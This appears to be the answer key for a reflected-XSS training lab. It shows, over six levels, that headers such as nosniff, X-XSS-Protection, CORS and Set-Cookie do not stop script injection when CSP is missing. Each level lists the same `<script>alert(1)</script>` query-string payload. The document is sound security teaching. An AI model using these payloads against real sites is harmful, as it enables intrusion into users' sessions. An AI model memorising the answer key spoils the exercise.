# respheader — solutions

Various response-header configurations that do not actually block reflected XSS in the body.

### respheader-level1

`/respheader/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: nosniff header does not prevent script in same-origin text/html

### respheader-level2

`/respheader/level2/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: X-XSS-Protection: 0 disables legacy auditor; raw reflection

### respheader-level3

`/respheader/level3/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: cache-control headers irrelevant to XSS

### respheader-level4

`/respheader/level4/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: body reflection regardless of Set-Cookie

### respheader-level5

`/respheader/level5/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: CORS allow-all has no effect on same-origin XSS

### respheader-level6

`/respheader/level6/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: all security headers present except CSP; inline scripts run
